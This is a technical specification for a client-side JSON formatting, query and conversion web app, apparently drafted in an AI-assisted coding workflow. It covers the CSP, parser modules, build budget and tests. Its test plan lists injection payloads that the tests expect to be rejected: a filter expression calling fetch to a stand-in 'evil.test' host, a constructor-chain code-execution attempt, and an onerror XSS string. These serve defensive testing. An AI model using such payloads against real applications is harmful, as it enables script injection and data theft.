# Technical Specification: JSON Workbench & Query Studio

**Related Intent**: `.claude/intents/2026-09-13-json-workbench-query-studio.md`
**Target Audience**: 2. Portfolio as a Work Sample, then 1. Visitor / Recruiter
**Route**: `/json` (aliases `/yaml` -> `/json#convert`, `/jsonpath` -> `/json#query`)

---

## 1. Architectural Impact & Component Overview

- **Impacted Layers**:
  - [x] Frontend standalone app (`frontend/json.html`, `frontend/json.css`, `frontend/js/json/`)
  - [x] Frontend Apps launcher shelf (`frontend/index.html`, `<section id="apps">`)
  - [x] Routing and sitemap (`frontend/.htaccess`, `frontend/sitemap.xml`)
  - [x] Build pipeline and tooling (`scripts/build.mjs`, `scripts/check_docs.py`, `scripts/generate_social_previews.py`, `package.json`)
  - [x] Documentation (`docs/JAVASCRIPT.md`, `docs/TESTING.md`, `docs/FRONTEND.md`, `docs/ARCHITECTURE.md`)
  - [ ] Backend API — **none**. No router, no service, no Pydantic schema.
  - [ ] Database — **none**. No model, no Alembic revision; `alembic check` is unaffected.

### 1.1 The one structural decision

`/crypto` is four independent tools that happen to share a page: each tab owns its
own input. `/json` is **one document seen through four lenses**. A single parsed
value lives in module state and every panel reads it:

```
                 ┌───────────────────────────────────────┐
   paste / drop  │  state.raw      (string, never stored) │
   ───────────▶  │  state.parsed   (JS value | null)      │
                 │  state.error    ({line, column, msg})  │
                 └───────┬───────────┬─────────┬─────────┘
                         │           │         │
                  #format      #query     #tree      #convert
                  (+ repair)   (evaluate) (render)   (emit)
```

`json-main.js` owns that state and re-publishes it on change; panels subscribe.
Parsing happens **once** per edit, debounced, not once per tab. This is what makes
"paste once, switch tabs" work and is the reason the module split below puts
parsing in its own module rather than inside the UI controller.

---

## 2. API Contract & Schemas

**None.** Fully client-side, consistent with `/cron` and `/crypto`. The page ships
`connect-src 'none'`, so there is no endpoint to specify, no authentication
decision to justify, and no rate limit to configure. Platform APIs used:
`JSON.parse` / `JSON.stringify`, `TextEncoder`, `FileReader`, `navigator.clipboard`,
`Blob` + `URL.createObjectURL` (download), `localStorage`, `matchMedia`.

---

## 3. Frontend Implementation & DOM Contract

### 3.1 Document shell — `frontend/json.html`

Mirrors `crypto.html`. Identical CSP, one line at a time:

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; base-uri 'self'; object-src 'none'; form-action 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'none';" />
```

`script-src 'self'` with **no `'unsafe-eval'`** is load-bearing here, not
boilerplate: it is the enforcement mechanism behind §3.3's no-`eval` rule. A
regression that reached for `new Function` would throw a CSP violation in the
browser rather than silently shipping a script-injection surface.

- `<html lang="en" data-theme="dark">`, theme resolved by `json-main.js` from the
  shared `theme` key before the panels render, `<meta name="theme-color">` synced.
- Head: canonical `https://rjasti.com/json`, Open Graph and Twitter card metadata
  pointing at `json-preview.png`, `fonts.css` then `json.css`.
- Chrome: the shared `.app-header` > `.header-container` > `.header-primary-bar`
  structure from `docs/FRONTEND.md`, brand icon `fa-diagram-project`, brand title
  "JSON Workbench", brand tag "Query Studio". Header actions: Clear All, theme
  toggle, and `.action-btn.back-btn` with `.back-label-long` / `.back-label-short`.
- Footer: `.app-footer` > `.footer-container` — privacy line, then cross-links to
  the portfolio, the apps shelf, and two sibling apps.
- Body: one source pane (textarea + drop zone + status strip) above four tab
  panels — `#format`, `#query`, `#tree`, `#convert` — as a `role="tablist"` with
  `aria-controls` / `aria-selected` and arrow-key roving tabindex.

### 3.2 Styling — `frontend/json.css`

- Defines the seven `--chrome-*` tokens from its own palette, then the shared
  chrome rules. Body tokens come from `docs/DESIGN.md`.
- Two-column workspace at >= 1024px (source left, result right), stacking to one
  column at <= 768px. The `#tree` panel is the split-view case: tree left, code
  right, and below 768px they become two stacked, independently scrolling panes.
- Four breakpoint tiers per the chrome contract: >= 1024 full labels, <= 1023
  icon-only actions and short back label, <= 640 back label drops and every target
  is >= 44x44, <= 430 brand subtitle hides.
- Monospace output blocks with tuned scrollbars, drag-over state on the drop zone,
  and error/success/warn status variants.

### 3.3 Modules — `frontend/js/json/`

Pure vanilla ES modules, one initialiser each, zero runtime imports. Line counts
are estimates for budgeting (§5), not commitments.

**1. `json-parser.js` (~450 lines)** — the tolerant parser and repair engine.

- `parseJson(text)` -> `{ ok, value, error }`. Fast path is `JSON.parse`; on
  failure the hand-written scanner re-reads the text to produce
  `{ line, column, offset, message, excerpt }`. `JSON.parse`'s own message is
  engine-specific and unusable as UI, which is why the scanner exists.
- `repairJson(text)` -> `{ text, value, repairs: [{ line, column, rule, detail }] }`.
  Rules, each individually testable and individually logged:
  trailing commas in objects and arrays; unquoted keys; single-quoted keys and
  strings; `//` line and `/* */` block comments; `NaN`, `Infinity`, `-Infinity`,
  `undefined`; Python `True` / `False` / `None`; smart quotes (`" " ' '`);
  missing commas between adjacent members; a single trailing garbage token.
- **Repair only ever rewrites syntax.** It never reorders keys, never coerces a
  type, never drops a value. A document it cannot repair returns the original text
  plus the error — it does not return a partially mangled document.
- `formatJson(value, { indent, sortKeys })` and `minifyJson(value)`.

**2. `json-query.js` (~420 lines)** — the query engine. Three-stage, no `eval`.

- `parseQuery(expression)` -> a path AST. Accepts `$`-rooted JSONPath, bare
  dot-notation (`items[0].id`, treated as `$.items[0].id`), and `filter(...)` sugar
  (`filter(price > 50)` desugars to `$[?(@.price > 50)]` against the current node).
- Supported segments: `.name`, `['name']`, `[n]`, `[-n]`, `[start:end:step]`,
  `[*]`, `..name` (recursive descent), `[?(expr)]`.
- `parseFilterExpression(src)` -> an expression AST via tokeniser + precedence
  climbing. Operators: `||`, `&&`, `!`, `==`, `!=`, `<`, `<=`, `>`, `>=`, plus
  `contains`, `startsWith`, `endsWith`. Operands: `@.path`, `$.path`, number,
  string, `true`, `false`, `null`.
- `evaluate(ast, root)` -> `[{ path, value }]` by a `switch` over known node types.
  **`eval`, `new Function`, `setTimeout(string)` and `innerHTML` appear nowhere in
  this file**, and a test asserts an injection payload yields a parse error.
- Unknown syntax returns a structured `{ error, column }` for an inline caret, not
  a thrown exception — the field updates on every keystroke.

**3. `json-tree.js` (~330 lines)** — the collapsible tree renderer.

- `renderTree(container, value, options)` builds only the root level. Children are
  built on first expand and cached; collapse hides rather than destroys.
- `CHILD_PAGE_SIZE = 200`: a node with more children renders the first 200 and a
  "Show N more" control. Without this a 5 MB document expanded whole is a frozen
  tab (see intent §5).
- Each row: expander, key, type badge, and a value preview truncated to 120 chars.
  **Every one written with `textContent`.** No `innerHTML` in this module.
- `formatPath(segments, dialect)` -> `"$.items[0].id"` | `"items[0].id"` |
  `"[\"items\"][0][\"id\"]"`, driving the breadcrumb's copy action.
- Expand-all is bounded by node count and refuses past a threshold with a notice
  rather than hanging.

**4. `json-yaml.js` (~480 lines)** — `toYaml(value, options)` and
`fromYaml(text)`.

- Emitter: 2-space block style; quotes any scalar that would otherwise re-read as
  another type — the YAML 1.1 ambiguity set `y|n|yes|no|on|off|true|false|null|~`,
  leading-zero numbers (`0755`), sexagesimals (`1:30`), and anything with leading
  or trailing whitespace or special leading punctuation. `|` block scalars for
  multi-line strings. Deterministic key order (insertion order preserved).
- Parser: a documented subset — block mappings and sequences, flow `{}`/`[]`,
  plain / single / double-quoted scalars, `|` and `>` block scalars with chomping
  indicators, `#` comments, `---` document start, null/bool/int/float resolution.
- **Rejects rather than guesses** on the excluded set (anchors `&`/`*`, merge keys
  `<<`, tags `!!`, multi-document streams, complex `? ` keys) with a message naming
  the construct and the line. Silent misinterpretation of a visitor's config would
  be the worst possible failure here.
- The `#convert` panel states the subset in the UI, not only in this spec.

**5. `json-csv.js` (~260 lines)** — `toCsv(value, options)` and `fromCsv(text, options)`.

- `toCsv` requires an array (an object is offered as a single row). Header is the
  **union of keys across all rows** in first-seen order, so a row missing a key
  yields an empty cell rather than a shifted column. Nested objects flatten to
  dotted paths (`address.city`); arrays-of-scalars join with a configurable
  separator; arrays-of-objects are rejected with an explanation.
- RFC 4180 quoting: fields containing the delimiter, `"`, `\r` or `\n` are quoted
  and inner `"` doubled. Configurable delimiter (`,` `;` `\t` `|`) and CRLF/LF.
- `fromCsv` handles quoted fields with embedded delimiters and newlines. Type
  inference is **opt-in and conservative**: a value converts to number only if it
  round-trips exactly, which leaves `00123`, `+15551234567` and `1e999` as strings.
  Leading-zero and oversized-integer preservation is tested explicitly.

**6. `json-typescript.js` (~300 lines)** — `toTypeScript(value, rootName)`.

- Walks the document inferring interfaces; nested objects become their own named
  interfaces (PascalCase from the key path, de-duplicated with a numeric suffix).
- Array element types are unified; heterogeneous arrays become a union
  (`(string | number)[]`). An array of objects whose keys differ marks keys absent
  from some elements as optional (`name?: string`).
- `null` becomes `| null`; empty arrays become `unknown[]`; empty objects become
  `Record<string, unknown>`. A structural cache gives identical shapes one shared
  interface instead of five copies.
- Keys that are not valid TS identifiers are emitted quoted. Recursion depth is
  bounded.
- **One-way in v1.** TypeScript -> sample JSON is deferred (intent §6.3).

**7. `json-ui.js` (~550 lines)** — DOM controller. Wires the source pane, the four
panels, debounce (150 ms), drag-and-drop with the 5 MB cap, copy-with-feedback,
download, the repair log, and the Clear All confirmation. Reads from the modules
above; owns no parsing logic of its own.

**8. `json-main.js` (~200 lines)** — entry point. Owns `state`, resolves the theme
before paint, handles tab switching and `hashchange`, persists preferences, and
installs an error boundary so a thrown module error renders a message instead of a
blank page.

### 3.4 Security & privacy contract

| Rule | Enforcement |
| :--- | :--- |
| No network egress | `connect-src 'none'` in the page CSP |
| No script evaluation | `script-src 'self'`, no `'unsafe-eval'`; hand-written expression parser; test asserts injection fails |
| No DOM injection | `textContent` only across `js/json/`; zero `innerHTML` — DOMPurify is not needed because no HTML string is ever built |
| No document persistence | `localStorage` key `rj-json:preferences` holds **tab, indent, dialect, delimiter, inference and repair toggles only**. Document text is stored only if the visitor turns on an explicit "Remember my document" switch that defaults to **off** |
| Privacy reset | Clear All wipes `state`, every field, and the storage key |
| Input cap | 5 MB on paste and on file drop, rejected before `FileReader` runs |

---

## 4. Routing, Shelf and Sitemap

### 4.1 `frontend/.htaccess`

`/json` is served from `json.html` by the **existing** extensionless rewrite
(rule 3) — no new rule needed. Two aliases are appended after the `/encode` rule,
matching the established pattern:

```apache
# 6. Alias /yaml to /json#convert
RewriteRule ^yaml/?$ /json#convert [R=301,NE,L]

# 7. Alias /jsonpath to /json#query
RewriteRule ^jsonpath/?$ /json#query [R=301,NE,L]
```

### 4.2 `frontend/index.html` — the Apps tile

Appended as the sixth `<a class="app-tile">` inside `<section id="apps">`
(currently ending at line 1505), following the five-things-to-change instruction
in the comment block above that section:

```html
<a class="app-tile reveal" href="/json" target="_blank" rel="noopener"
  aria-label="Launch the JSON Workbench & Query Studio in a new tab">
  <span class="app-tile-media">
    <img src="json-preview.png" alt="" width="1200" height="630" loading="lazy" decoding="async" />
  </span>
  <span class="app-tile-body">
    <span class="app-tile-eyebrow"><i class="fas fa-diagram-project" aria-hidden="true"></i>Dev Tools</span>
    <h3 class="app-tile-title">JSON Workbench</h3>
    <p class="app-tile-text">Format, validate and repair malformed JSON with line-accurate errors, query it live with JSONPath or dot-notation filters, explore it as a collapsible tree, and convert between JSON, YAML, CSV and TypeScript interfaces.</p>
    <span class="app-tile-cta">Launch<i class="fas fa-arrow-up-right-from-square" aria-hidden="true"></i></span>
  </span>
</a>
```

**Icon audit (verified against `frontend/fonts.css`)**: `fa-diagram-project`,
`fa-filter`, `fa-copy`, `fa-code`, `fa-table-list`, `fa-layer-group`,
`fa-wand-magic-sparkles`, `fa-chevron-right`, `fa-chevron-down`, `fa-trash-can`,
`fa-download`, `fa-triangle-exclamation`, `fa-circle-check`, `fa-magnifying-glass`,
`fa-sun`, `fa-moon`, `fa-arrow-left`, `fa-arrow-up-right-from-square` are **all
already in the vendored subset**. `scripts/vendor_fonts.py` does not need
re-running, and no font asset changes.

**CSP note**: this edit adds markup only. `index.html`'s three pinned inline
`<script>` bodies are untouched, so `scripts/check_csp_hashes.py` still passes with
the existing hashes. Do not run `npm run format` over `index.html` — it is in
`.prettierignore` precisely because reformatting inline scripts breaks those hashes.

### 4.3 `frontend/sitemap.xml`

```xml
<url>
  <loc>https://rjasti.com/json</loc>
  <lastmod>2026-09-13</lastmod>
  <changefreq>monthly</changefreq>
  <priority>0.6</priority>
  <image:image>
    <image:loc>https://rjasti.com/json-preview.png</image:loc>
    <image:title>JSON Workbench &amp; Query Studio | Client-side JSON toolkit</image:title>
    <image:caption>Preview card for the JSON Workbench and Query Studio</image:caption>
  </image:image>
</url>
```

---

## 5. Build Pipeline Updates

### 5.1 The size budget — the one blocking change

Measured on `main` at the time of writing (`npm run build`):

| Kind | Used | Ceiling | Headroom |
| :--- | ---: | ---: | ---: |
| JS | **300.2 KiB** | 305 KiB | 4.8 KiB |
| CSS | **246.1 KiB** | 250 KiB | 3.9 KiB |

For calibration, the two comparable apps cost:

| App | JS | CSS |
| :--- | ---: | ---: |
| `/cron` | 28.2 KiB | 22.8 KiB |
| `/crypto` | 18.5 KiB | 19.4 KiB |
| `/json` (projected) | ~32 KiB | ~20 KiB |

The feature does not fit. `scripts/build.mjs` throws and CI fails before deploy.
The comment above `BUDGETS_KIB` prescribes the remedy — *"raise BUDGETS_KIB in
scripts/build.mjs and say why in the commit"* — so:

```js
const BUDGETS_KIB = { js: 345, css: 275 };
```

amended in the same commit with a paragraph in that comment block stating that the
rise is a sixth standalone app with six hand-written parsers and emitters, not a
dependency, and that the ~10 KiB of app-chrome CSS triplicated across
`arcade.css` / `cron.css` / `crypto.css` remains the outstanding reclaim.

**Trade-off (Speed vs. Maintenance)**: extracting that shared chrome stylesheet
first would recover roughly 10 KiB of the CSS rise, but it is a refactor touching
three shipped apps and their four breakpoint tiers — the same comment already calls
it "its own change". Recommendation: raise the ceilings here, keep the chrome
extraction as a separate follow-up where a regression is attributable.

### 5.2 `scripts/build.mjs`

1. New esbuild entry beside the `/cron` and `/crypto` blocks:
   ```js
   const jsonApp = await esbuild.build({
     entryPoints: [join(SRC, "js/json/json-main.js")],
     bundle: true, minify: true, sourcemap: true, format: "esm", target: ["es2022"],
     outdir: join(OUT, "assets"), entryNames: "json-[hash]", metafile: true, logLevel: "warning",
   });
   ```
   plus the matching `rewrites.set("js/json/json-main.js", ...)` loop.
2. Add `"json.css"` to the CSS array at line 238.
3. `json.html` needs **no** registration: the HTML rewrite step walks `SRC` and
   picks up every `.html` file automatically (line 308). `json-preview.png` is
   content-hashed by the static copy step like every other preview.

### 5.3 `scripts/check_docs.py`

Append `"frontend/js/json/"` to `JS_ROOTS` (line 53) so the eight new modules are
covered by the "every shipped module is documented" check.

### 5.4 `package.json`

Extend the `lint:js` glob with `frontend/js/json/*.js` — without it ESLint silently
skips the entire new directory.

### 5.5 `scripts/generate_social_previews.py`

Add `"json": ("json-preview.html", "json-preview.png")` to `CARDS`, and author
`scripts/social-previews/json-preview.html` modelled on `crypto-preview.html`.
Render with `python3 scripts/generate_social_previews.py json`.

---

## 6. Documentation Updates

| File | Change | Gated? |
| :--- | :--- | :--- |
| `docs/JAVASCRIPT.md` | New `## JSON Workbench (/json)` section after the Crypto section, one `###` heading per module with real line counts | **Yes** — `check_docs.py` fails on a missing or miscounted module |
| `docs/TESTING.md` | Four new rows with real line counts | **Yes** — same script |
| `docs/JAVASCRIPT.md` storage table | Add `rj-json:preferences` | No, but the table is the contract |
| `docs/FRONTEND.md` | "The five standalone apps" -> six (line 508); the app list and sitemap rows (~492, ~495); the theme-sharing paragraph (~563); the static-copy and dev-server notes (~784, ~836) | No |
| `docs/ARCHITECTURE.md` | Repo-map rows for `js/json/` and `json.html` + `json.css`, matching the `js/arcade/` entries | No |
| `.claude/rules/navigation.md` / `reference-docs.md` | Regenerated figures — `json.css` is far below the never-read-whole threshold, but doc token counts move | **Yes** — via `--fix` |

---

## 7. Verification & Test Plan

### 7.1 New suites under `frontend/tests/`

**`json-parser.test.js`** — valid documents of every shape; deterministic
`line:column` on a known-bad fixture; **one test per repair rule**; repair is a
no-op on already-valid input; repair output always re-parses with `JSON.parse`;
an unrepairable document returns the original text plus an error; deep nesting
does not blow the stack; duplicate keys behave as documented.

**`json-query.test.js`** — each segment type (`.name`, `['name']`, `[n]`, `[-n]`,
slices with and without step, `[*]`, `..name`); filter operators and precedence
(`a && b || c`); `filter(price > 50)` sugar equals its JSONPath form; bare
dot-notation equals its `$`-rooted form; returned paths round-trip back through
the engine to the same node; a syntax error yields `{ error, column }` rather than
a throw. **Security**: `[?(@.x == 1); fetch('https://evil.test'))]`,
`[?(constructor.constructor('return 1')())]` and similar payloads must produce a
parse error — the test asserts refusal, not sanitisation.

**`json-convert.test.js`** — YAML: emit/parse round-trip over a fixture set;
**the YAML 1.1 ambiguity vectors** (`no`, `yes`, `on`, `off`, `null`, `~`, `0755`,
`1:30`, `1.0`, `""`) each survive a round-trip as the original type; `|` block
scalars preserve newlines; each excluded construct (anchor, merge key, tag,
multi-doc) is rejected with the line named. CSV: header union across ragged rows;
RFC 4180 quoting of embedded `,`, `"`, `\n`; round-trip equality; `00123` and
`+15551234567` stay strings under inference. TypeScript: nested interface
extraction, optional keys from ragged object arrays, union element types, `null`
handling, quoted invalid identifiers, shared interface for identical shapes.

**`json-tree.test.js`** (jsdom) — root renders without building descendants;
children appear only on expand; a 500-child node renders 200 plus a "Show more"
control; `formatPath` in all three dialects, including a key needing bracket
escaping; a value of `<img src=x onerror=alert(1)>` lands as text — assert via
`textContent` and that `querySelector('img')` is null.

### 7.2 Gate sequence

```bash
npm run lint                                        # ESLint (incl. js/json) + Stylelint
npm test                                            # Node test runner + jsdom
npm run build                                       # bundles AND enforces the size budget
python3 scripts/check_csp_hashes.py                 # must pass unchanged
python3 scripts/check_docs.py --fix --show-tokens   # then re-run without --fix to confirm clean
```

Per `AGENTS.md` §6, `npm ci --no-audit --no-fund` must have run first. Backend
gates (`ruff`, `pytest`, `alembic check`) are untouched by this change and are not
claimed as evidence for it.

### 7.3 Manual checks before merge

1. `/json`, `/json#query`, `/json#tree`, `/json#convert` deep-link correctly; the
   back button leaves the page rather than cycling tabs.
2. `/yaml` and `/jsonpath` 301 to the right fragments.
3. Theme set to light on the portfolio carries into `/json`; toggling updates
   `<meta name="theme-color">`.
4. Chrome behaves at all four tiers (>= 1024, <= 1023, <= 640, <= 430); every
   target is >= 44x44 on mobile.
5. A 4 MB document stays responsive; a 6 MB document is rejected with a notice.
6. Keyboard-only: tablist arrow keys, every control reachable, visible focus.
7. DevTools Network tab shows **zero** requests after load.

---

## 8. Open Decisions for Approval

| # | Decision | Recommendation |
| :--- | :--- | :--- |
| 1 | Raise `BUDGETS_KIB` to `{ js: 345, css: 275 }` in this change | **Yes** — the alternative is a three-app CSS refactor bundled into a feature commit |
| 2 | TypeScript direction | **JSON -> TS only in v1.** TS -> sample JSON needs a declaration parser; it is ~250 lines and a second grammar. Say the word and it ships in v1 |
| 3 | "Remember my document" toggle | **Ship it, default off.** People paste bearer tokens into JSON tools |
| 4 | JSON Schema generation | **Defer.** Not among the four features asked for; roughly doubles the module surface |
| 5 | Eyebrow / icon | **"Dev Tools" + `fa-diagram-project`** — shares the category with `/cron`, and the glyph is already in the subset |
